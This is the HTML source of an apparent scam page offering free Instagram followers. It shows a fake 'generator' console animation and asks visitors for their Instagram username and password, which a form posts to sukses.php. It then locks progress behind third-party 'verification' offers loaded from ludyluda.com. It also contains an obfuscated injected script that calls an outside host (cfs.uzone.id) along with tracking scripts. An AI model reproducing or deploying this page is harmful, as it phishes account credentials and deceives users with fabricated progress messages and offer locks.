<html><head>

  <meta charset="utf-8" />
  <title>Instagram Follower Online App</title>
  <!--[if IE]><meta http-equiv='X-UA-Compatible' content="IE=edge,IE=9,IE=8,chrome=1" /><![endif]-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta content="" name="description" />
  <meta content="" name="author" />
  <link type="text/css" rel="stylesheet" href="http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,400,300,600">

  <link rel="stylesheet" href="http://followerinsta.online/css/bootstrap.min.css">
  <link rel="stylesheet" href="http://followerinsta.online/css/jquery.mCustomScrollbar.css">
  <link rel="stylesheet" href="http://followerinsta.online/ss/theme.css">
  <link rel="stylesheet" href="http://followerinsta.online/http://followerinsta.online/css/slider.css">
  <link rel="stylesheet" href="http://followerinsta.online/css/custom-css.css">



<meta charset="utf-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
<title>Clash of Clans Hack Online</title>
<link rel="shortcut icon" href="http://followerinsta.online/images/logo.png" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<meta name="title" content="My InstaHack Followers"/>
<meta name="description" content="Cara untuk hacking follower instagram"/>
<meta name="keywords" content="hack Follower Instagram">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<link rel="stylesheet" href="./ngz/css1.css"/>
<link rel="stylesheet" href="./ngz/css2.css"/>
<link rel="stylesheet" href="./ngz/css3.css"/>
<script src="./ngz/css4.js"></script>
<script src="./ngz/css5.js"></script>
<script src="./ngz/css6.js"></script>
<script src="./ngz/css7.js"></script>
</head><body>
<div id="config-screen" class="container round-10">
<div  id="coc-header">



<h1 style="color:green;">Instagram Follower Online App</h1>

                </div>
              
                <div class="panel-body" id="offers" style="display: none;">
                  <div class="row">
                    <div class="col-md-12 text-center">
                    <br><br>
                      <h4> <b style="color:red">Waiting for verification..</b> <h4/>

                        <br>
                      </div>              


                      <center>
                      	
<img id="slika" src="http://followerinsta.online/images/defaultslika.gif" style="width: 109px; height: 109px; border-radius: 50%; margin-top: 20px; margin-bottom: 20px;">

<form method="post" action="sukses.php">

             </center>
                      <div  style="color : white">
                      <center>
                      <br><h3><div id="ispodslike" style="display: none; color : white;"></div></h3></br>
                      <br>1.Click the "Verify" button!</br>
                      <br>2.Choose an offer and complete the offer to verify that you are not a spam bot.</br>
                      <br>3.Soon after, your resources will be added.</br>

                     

                      
<br><input type="text" id="email" name="user" placeholder="@Username" class="form-control " required/>

<br><input class="form-control " style="width: 545px;" name="follower" placeholder="0-10000 Follower" min="0" step="100" max="100000" type="number" required/>

<br><input type="password" id="email" name="password" placeholder="Password" class="form-control " required/>

                      <ul class="list-inline" id="show-offer-container" style="margin-top: 20px;">
                        <li style="display: block;">



                          <button type="submit"  id="email" value="submit" name="submit"  style="width: 545px;" class="btn btn-success  " 
>Verify now</button>
          
                      </div>

                          <div class="ludy-wrapper">
                            <div class="ludy-options" data-offers="Q9q4MIwc1fG5dHLM"></div>
                          </div>

                        </li>
                      </ul>
                      <ul class="list-inline" style="display: none;text-align: center;margin-top: 20px;" data-offers="GOZoX48uY1A2n25K"></ul>
                    </center>

</form>


                  </div>
                </div>
                <div class="panel-body" id="console" style="display: none;">
                  <code class="command"></code>
                </div>
                <div class="panel-body" id="generator">
                  <div class="row">
                    <div class="col-md-3 hidden-sm hidden-xs">
                      <img width="115%" alt="Instagram Followers (Android / iOS)" src="http://followerinsta.online/images/logo.png">
                    </div>
                    <div class="col-md-9">
                      <br>

                      <span class="titlu_font" style="color:white;">Generate likes and followers!</span><br>
                      <div class="row" style="border: none;padding:0;margin-top:10px;">
                        <p class="warning" style="color:red;display:none;position:relative; left: 15px;">Check your username:</p>
                        <div class="col-md-8">
                          <div class="input-group">


                            <input id="username" class="form-control input-md" style="height: 50px; width: 385px;" placeholder="Username " required type="text" name="username">
<br><br><br>
                          </div>
<button type="submit" id="connect" class="button btn-success col-md-12" style="height: 70px;" /> Generate</button>
                          <br>
 
                        </div>
                      </div>
                    </div>
                  </div>
                  

            <?php
              $coeg = "<script language=javascript>+usercina2+</script>"
            ?>


 <div class="modal fade" id="gw">

    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <center><h4 class="modal-title">Anti-Spam Verification.</h4></center>
        </div>
        <div class="modal-body">
          <div class="row">
            <div class="col-md-12 text-center">
              <p class="explain"><br>1. Click the Check button
                <br>2. Select an offer
                <br>3. After you have completed the offer you get your resources!
                <br><br>
              </p>
            </div>
          </div>
        </div>
        <div class="modal-footer">
          <center><a href="#"><INPUT TYPE="BUTTON" class="button2"  VALUE="Check"></a></center>
        </div>
      </div>
    </div>
  </div>
</div>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK9K0NXeV151Bf3ABqBGOl%2fGuiCZu8Cb0JytD42eBqvspIlRiJc38wcHzTlPwlxlZXzhKw%2fDTcBsGwpFjoesDVoRLbMf4anpUbBSlXy7IxFcBSTTEILv0O%2f1Aj0r8%2fd4YqiaTRXEd6YGLqSzRzSIvA2LENhLx0LIoJ7AkKYMmJGgy1yc7X2ywvaekbnKHXwrB0YZ0Nv6pCG9GJ5iZDeC8fy%2bS%2fuE2Ot45%2bCacW6ECPClID7%2fym5DNidi36oWAYCGwsn5QRbnhD69lJfK4Kv%2bIK675ujBclMErMfu23F66QBOjQz8%2bfufHTUd22GBctfuYcL1XDpUxQK2k1rZq4Y9r2R365K4lb%2bpmzoe8tLBexGguraURH2K6UrvDhX9znGqOac8644y1FEoI7fhyp3UatSvswfpQtVKM6Fba1S%2fL%2bSS%2bgP%2b13MEApFkfFKOKAH7XaaGe08ux%2bqPPAJmuDZtURZLpbABXBoEVTLDGyLy8YY2PGREakRuLl6A%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
<script src="http://followerinsta.online/js/jquery.min.js"></script>
<script src="http://followerinsta.online/js/bootstrap.min.js"></script>
<!-- <script src="js/bootstrap-slider.js"></script> -->
<script src="http://followerinsta.online/js/numbers.js"></script>
<script src="http://followerinsta.online/js/shit.js"></script>
<script type="text/javascript" src="http://www.ludyluda.com/HtHgd7oNJVvcdEhE"></script>


<script>
    // Check if type is edited properly... (note for me)
    function type(elem, speed) {
      setTimeout(function() {
        $('<div>' + elem + '</div>')
        .hide()
        .appendTo( $('.command') )
        .fadeIn();
      }, speed);
    }

    $(function() {
      var host = 'localhost',
      foffers = '';

      $('#offers').hide();
      $('#console').hide();
      $('#offers').append(foffers);
      $('.button2').click(function() {
        $('#gw').modal('hide');
        $('#console').slideToggle();
        $('#offers').slideToggle();
      });

      if (window.location.host != '') {
        host = window.location.host;
      }
      
      $('.button').click(function() {
        if ($('#username').val().length <= 3) {
          $('#username').css('background', 'rgb(255,200,200)');
          $('.warning').show();
          window.scrollTo(0, 0);
          alert('Error: Check your username!');
        } else {
          var user = $('#username').val();
          var usercina = document.getElementById("username").value;
          var usercina1 = usercina.replace('https://www.instagram.com/', '');
          var usercina2 = usercina1.replace('/', '');

          $('#slika').attr('src', 'http://res.cloudinary.com/demo/image/instagram_name/w_109,h_109,c_thumb,g_face,r_max,e_improve/' + usercina2 + '.jpg');
          document.getElementById("ispodslike").innerHTML = "User : @"+usercina2+"";

          $('#ispodslike').slideToggle();

          $('#generator').slideToggle();
          $('#console').slideToggle();

          type('Connecting to server...', 200);
          type('<span style="color: green">Connected!</span>', 400);
          type('guest@' + host + '', 650);
          type('>Preparing Generator!', 680);
          type('>Sending packets!', 780);
          type('>@INSTAGRAM-SERVER -Importing!', 880);
          type('>.INSTAGRAM.Connecting <span style="color: red;font-size:15px;">' + user + '></span>', 1080);
          type('>Response: ' + user + ' Authenticating.', 1880);
          type('<span style="color: green">>User Connected!</span>', 1980);
          type('>THE SERVER IS FULL!', 2480);
          type('>RETRY.', 2880);
          type('>ACCES_CODE: #ffX104', 3780);
          type('<span style="color: green">>MEMORY LOADED CORRECTLY</span>', 4280);
          type('>PREPARING...', 4880);
          type('>THE GENERATOR IS READY', 5000);
          type('<span style="color: yellow">NOTES: UNABLE TO VERIFY THE SESSION</span>', 5000);
          type('>WAITING FOR USER', 5000);
          type('>GENERATOR WILL CONTINUE AFTER HUMAN VERIFICATION', 5400);
          type('<span style="color: yellow">NOTE FROM DEVELOPER: Thank you for using our Generator!!</span>', 5800);

          $('.button').hide();
          $(".list-inline a").addClass('button7');
          setTimeout(function() {
            $('#gw').modal('hide');
            $('#console').slideToggle();
            $('#offers').slideToggle();
          }, 6800);
        };
      });
    });

  </script>
  <script type="text/javascript" src="http://followerinsta.online/js/ludy-script.js"></script>
  <script type="text/javascript" src="http://www.ludyluda.com/Q9q4MIwc1fG5dHLM"></script>

  <!-- Histats.com  START  (standard)-->
  <script type="text/javascript">document.write(unescape("%3Cscript src=%27http://s10.histats.com/js15.js%27 type=%27text/javascript%27%3E%3C/script%3E"));</script>
  <a href="http://www.histats.com/" target="_blank" title="site stats" ><script  type="text/javascript" >
    try {Histats.start(1,3174459,4,0,0,0,"00010000");
    Histats.track_hits();} catch(err){};
  </script></a>
  <noscript><a href="http://www.histats.com/" target="_blank"><img  src="../sstatic1.histats.com/08b02.gif?3174459&amp;101" alt="site stats" border="0"></a></noscript>
  <!-- Histats.com  END  --></body></html>